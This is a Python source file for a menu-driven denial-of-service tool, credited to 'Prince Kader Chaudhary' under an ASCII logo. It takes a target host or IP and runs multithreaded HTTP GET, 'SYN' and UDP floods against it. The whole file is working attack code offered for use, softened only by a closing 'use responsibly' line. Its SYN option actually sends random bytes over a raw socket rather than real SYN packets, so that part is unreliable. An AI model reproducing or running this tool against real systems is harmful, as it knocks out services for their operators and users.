import socket
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import time
import sys

# ASCII Logo
logo = '''
 
 
 $$$$$$\            $$\                                  $$$$$$\  $$\   $$\       
$$  __$$\           $$ |                                $$  __$$\ $$ |  $$ |      
$$ /  \__|$$\   $$\ $$$$$$$\   $$$$$$\   $$$$$$\        \__/  $$ |$$ |  $$ |      
$$ |      $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\        $$$$$$  |$$$$$$$$ |      
$$ |      $$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|      $$  ____/ \_____$$ |      
$$ |  $$\ $$ |  $$ |$$ |  $$ |$$   ____|$$ |            $$ |            $$ |      
\$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$$\ $$ |            $$$$$$$$\       $$ |      
 \______/  \____$$ |\_______/  \_______|\__|            \________|      \__|      
          $$\   $$ |                                                              
          \$$$$$$  |                                                              
           \______/                                                               
                                           Prince Kader Chaudhary 
'''

# ANSI escape sequences for styling (Color and bold)
class Style:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Function to simulate a spinner animation during processing
def spinner(message):
    spinner_characters = ["|", "/", "-", "\\"]
    idx = 0
    while True:
        sys.stdout.write(f"\r{message} {spinner_characters[idx]}")
        sys.stdout.flush()
        time.sleep(0.2)
        idx = (idx + 1) % len(spinner_characters)


# Function to calculate the system resource and limit thread usage
def calculate_thread_limit():
    try:
        total_memory = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024 ** 3)  # Convert bytes to GB
        cpu_count = os.cpu_count()

        if total_memory < 2:
            print(f"{Style.WARNING}Device RAM is below 2GB. Limiting threads to 50 for safety.{Style.ENDC}")
            return 50
        elif total_memory < 4:
            print(f"{Style.WARNING}Device RAM is between 2GB and 4GB. Limiting threads to 100 for optimal performance.{Style.ENDC}")
            return min(cpu_count * 10, 100)
        else:
            print(f"{Style.OKGREEN}Device RAM is 4GB or higher. You can safely use up to 200 threads.{Style.ENDC}")
            return min(cpu_count * 20, 200)
    except Exception:
        print(f"{Style.FAIL}Could not detect system RAM. Using default thread limit: 100.{Style.ENDC}")
        return 100


# HTTP Flood Attack with Throttling
def http_flood(target_host, path="/", port=80, threads=100, request_rate=10):
    def send_http_request():
        while True:
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.connect((target_host, port))
                conn.send(f"GET {path} HTTP/1.1\r\nHost: {target_host}\r\n\r\n".encode())
                conn.close()
                print(f"{Style.OKGREEN}HTTP Flood sent to {target_host}:{port}{Style.ENDC}")
                time.sleep(1 / request_rate)
            except Exception as e:
                print(f"{Style.FAIL}Error: {e}{Style.ENDC}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            executor.submit(send_http_request)


# SYN Flood Attack with Throttling
def syn_flood(target_ip, target_port, threads=100, packet_rate=10):
    def send_syn_packet():
        while True:
            try:
                packet = random._urandom(1024)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.sendto(packet, (target_ip, target_port))
                print(f"{Style.OKGREEN}SYN Packet sent to {target_ip}:{target_port}{Style.ENDC}")
                time.sleep(1 / packet_rate)
            except Exception as e:
                print(f"{Style.FAIL}Error: {e}{Style.ENDC}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            executor.submit(send_syn_packet)


# UDP Flood Attack with Throttling
def udp_flood(target_ip, target_port, threads=100, packet_rate=10):
    def send_udp_packet():
        while True:
            try:
                packet = random._urandom(1024)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet, (target_ip, target_port))
                print(f"{Style.OKGREEN}UDP Packet sent to {target_ip}:{target_port}{Style.ENDC}")
                time.sleep(1 / packet_rate)
            except Exception as e:
                print(f"{Style.FAIL}Error: {e}{Style.ENDC}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            executor.submit(send_udp_packet)


# Display attack instructions with nice formatting
def display_instructions():
    print(f"\n{Style.BOLD}--- Attack Instructions ---{Style.ENDC}")
    print(f"{Style.OKBLUE}[1]{Style.ENDC} HTTP Flood - Overwhelm the target server with HTTP GET requests.")
    print(f"{Style.OKBLUE}[2]{Style.ENDC} SYN Flood - Send SYN packets to exhaust server resources.")
    print(f"{Style.OKBLUE}[3]{Style.ENDC} UDP Flood - Flood target with UDP packets to disrupt its functionality.")
    print(f"{Style.OKBLUE}[4]{Style.ENDC} Exit - Quit the tool.\n")


# Main menu
def main():
    os.system("cls" if os.name == "nt" else "clear")
    
    # Display the logo and author info
    print(f"{Style.OKGREEN}{logo}{Style.ENDC}")

    thread_limit = calculate_thread_limit()  # Automatically calculate thread limit

    while True:
        display_instructions()
        choice = input(f"{Style.BOLD}Select an attack method: {Style.ENDC}").strip()

        if choice == '1':
            target_host = input(f"{Style.OKBLUE}Enter target host (e.g., example.com): {Style.ENDC}").strip()
            port = int(input(f"{Style.OKBLUE}Enter port (default 80): {Style.ENDC}") or 80)
            path = input(f"{Style.OKBLUE}Enter path (default '/'): {Style.ENDC}") or "/"
            threads = int(input(f"{Style.OKBLUE}Enter number of threads (recommended <= {thread_limit}): {Style.ENDC}") or thread_limit)
            request_rate = int(input(f"{Style.OKBLUE}Enter request rate (default 10): {Style.ENDC}") or 10)
            print(f"{Style.OKGREEN}Starting HTTP Flood...{Style.ENDC}")
            threading.Thread(target=spinner, args=("Sending HTTP requests",), daemon=True).start()
            http_flood(target_host, path, port, threads, request_rate)
        elif choice == '2':
            target_ip = input(f"{Style.OKBLUE}Enter target IP: {Style.ENDC}").strip()
            target_port = int(input(f"{Style.OKBLUE}Enter target port: {Style.ENDC}").strip())
            threads = int(input(f"{Style.OKBLUE}Enter number of threads (recommended <= {thread_limit}): {Style.ENDC}") or thread_limit)
            packet_rate = int(input(f"{Style.OKBLUE}Enter packet rate (default 10): {Style.ENDC}") or 10)
            print(f"{Style.OKGREEN}Starting SYN Flood...{Style.ENDC}")
            threading.Thread(target=spinner, args=("Sending SYN packets",), daemon=True).start()
            syn_flood(target_ip, target_port, threads, packet_rate)
        elif choice == '3':
            target_ip = input(f"{Style.OKBLUE}Enter target IP: {Style.ENDC}").strip()
            target_port = int(input(f"{Style.OKBLUE}Enter target port: {Style.ENDC}").strip())
            threads = int(input(f"{Style.OKBLUE}Enter number of threads (recommended <= {thread_limit}): {Style.ENDC}") or thread_limit)
            packet_rate = int(input(f"{Style.OKBLUE}Enter packet rate (default 10): {Style.ENDC}") or 10)
            print(f"{Style.OKGREEN}Starting UDP Flood...{Style.ENDC}")
            threading.Thread(target=spinner, args=("Sending UDP packets",), daemon=True).start()
            udp_flood(target_ip, target_port, threads, packet_rate)
        elif choice == '4':
            print(f"{Style.OKGREEN}\nExiting program. Stay safe and use responsibly!{Style.ENDC}")
            break
        else:
            print(f"{Style.FAIL}\nInvalid choice. Please try again.{Style.ENDC}")


if __name__ == "__main__":
    main()